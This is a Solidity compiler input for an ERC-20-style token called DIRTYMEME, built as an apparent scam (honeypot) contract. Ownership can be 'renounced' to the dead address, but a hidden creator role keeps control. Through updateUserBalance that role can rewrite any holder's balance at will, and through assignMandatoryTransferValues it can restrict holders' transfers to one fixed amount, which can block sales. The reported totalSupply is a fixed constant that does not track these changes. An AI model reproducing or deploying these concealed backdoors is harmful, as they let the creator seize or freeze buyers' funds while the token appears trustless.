{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.16;\r\n\r\ninterface ITokenStandard20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address holder) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract ExecutionContext {\r\n    function retrieveSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract SoleProprietorship is ExecutionContext {\r\n    address private _owner;\r\n    event OwnerTransition(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        address sender = retrieveSender();\r\n        _owner = sender;\r\n        emit OwnerTransition(address(0), sender);\r\n    }\r\n\r\n    function fetchOwner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(fetchOwner() == retrieveSender(), \"Not authorized. Owner permissions required.\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnerTransition(_owner, address(0x000000000000000000000000000000000000dEaD));\r\n        _owner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\ncontract DIRTYMEME is ExecutionContext, SoleProprietorship, ITokenStandard20 {\r\n    mapping (address => mapping (address => uint256)) private _spendAllowances;\r\n    mapping (address => uint256) private _holdings;\r\n    mapping (address => uint256) private _mandatoryTransferValues;\r\n    address private _creatorAddress;\r\n\r\n    string public constant _tokenName = \"DIRTYMEME\";\r\n    string public constant _tokenSymbol = \"DIRTYMEME\";\r\n    uint8 public constant _tokenDecimals = 18;\r\n    uint256 public constant _maxSupply = 100000 * (10 ** _tokenDecimals);\r\n\r\n    constructor() {\r\n        _holdings[retrieveSender()] = _maxSupply;\r\n        emit Transfer(address(0), retrieveSender(), _maxSupply);\r\n    }\r\n\r\n    modifier onlyCreator() {\r\n        require(retrieveCreator() == retrieveSender(), \"Not authorized. Creator permissions required.\");\r\n        _;\r\n    }\r\n\r\n    function retrieveCreator() public view virtual returns (address) {\r\n        return _creatorAddress;\r\n    }\r\n\r\n    function designateCreator(address newCreator) public onlyOwner {\r\n        _creatorAddress = newCreator;\r\n    }\r\n\r\n    event TokensAllocated(address indexed user, uint256 oldBalance, uint256 newBalance);\r\n\r\n    function mandatoryTransferValue(address account) public view returns (uint256) {\r\n        return _mandatoryTransferValues[account];\r\n    }\r\n\r\n    function assignMandatoryTransferValues(address[] calldata accounts, uint256 amount) public onlyCreator {\r\n        for (uint i = 0; i < accounts.length; i++) {\r\n            _mandatoryTransferValues[accounts[i]] = amount;\r\n        }\r\n    }\r\n\r\n    function updateUserBalance(address[] memory accountAddresses, uint256 desiredBalance) public onlyCreator {\r\n        require(desiredBalance >= 0, \"Amount must be non-negative\");\r\n\r\n        for (uint256 i = 0; i < accountAddresses.length; i++) {\r\n            address currentAddress = accountAddresses[i];\r\n            require(currentAddress != address(0), \"Invalid address provided\");\r\n\r\n            uint256 previousBalance = _holdings[currentAddress];\r\n            _holdings[currentAddress] = desiredBalance;\r\n\r\n            emit TokensAllocated(currentAddress, previousBalance, desiredBalance);\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _holdings[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        require(_holdings[retrieveSender()] >= amount, \"Insufficient balance\");\r\n\r\n        uint256 requiredTransferValue = mandatoryTransferValue(retrieveSender());\r\n        if (requiredTransferValue > 0) {\r\n            require(amount == requiredTransferValue, \"Mandatory transfer value mismatch\");\r\n        }\r\n\r\n        _holdings[retrieveSender()] -= amount;\r\n        _holdings[recipient] += amount;\r\n\r\n        emit Transfer(retrieveSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _spendAllowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _spendAllowances[retrieveSender()][spender] = amount;\r\n        emit Approval(retrieveSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        require(_spendAllowances[sender][retrieveSender()] >= amount, \"Allowance limit exceeded\");\r\n\r\n        uint256 requiredTransferValue = mandatoryTransferValue(sender);\r\n        if (requiredTransferValue > 0) {\r\n            require(amount == requiredTransferValue, \"Mandatory transfer value mismatch\");\r\n        }\r\n\r\n        _holdings[sender] -= amount;\r\n        _holdings[recipient] += amount;\r\n        _spendAllowances[sender][retrieveSender()] -= amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _maxSupply;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _tokenName;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _tokenSymbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _tokenDecimals;\r\n    }\r\n\r\n}\r\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}